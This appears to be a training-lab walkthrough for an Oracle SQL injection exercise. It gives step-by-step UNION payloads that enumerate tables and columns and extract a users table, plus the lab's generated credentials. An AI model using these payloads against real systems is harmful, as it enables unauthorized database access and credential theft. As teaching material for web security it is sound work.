

````markdown
# Lab: SQL Injection Attack — Listing Database Contents on Oracle

This lab contains a **SQL Injection** vulnerability in the product category filter.  
The results from the query are returned in the application's response, so a **UNION attack** can be used to retrieve data from other tables.

The application has a login function, and the database contains a table holding usernames and passwords.  
The goal is to determine the table name and column names, then retrieve all usernames and passwords.

To solve the lab, log in as the `administrator` user.

---

## Solution

**Vulnerable Parameter:** `category`  
**Attack Type:** `UNION ATTACK`

---

### 1. Determine Number of Columns
```bash
'+UNION+SELECT+NULL,NULL+FROM+dual--
````

---

### 2. Columns Containing Strings

```bash
'+UNION+SELECT+'a','b'+FROM+dual--
```

---

### 3. Find Table Names

```bash
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

Table found: **`USERS_VVRYEE`**

---

### 4. Find Column Names

```bash
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name+='USERS_VVRYEE'--
```

Columns found:

* `USERNAME_CVFMSR`
* `PASSWORD_QYEPBX`

---

### 5. Extract Usernames and Passwords

```bash
'+UNION+SELECT+USERNAME_CVFMSR,PASSWORD_QYEPBX+FROM+USERS_VVRYEE--
```

Retrieved credentials:

| Username      | Password             |
| ------------- | -------------------- |
| administrator | vwhlzxr85dt4z4oqr0eu |
| carlos        | pcgje7l2hfxenlniwrgn |
| wiener        | k8c377k6fkd1q5na2dli |

---

### 6. Login

Use the retrieved credentials to log in as the administrator.

---


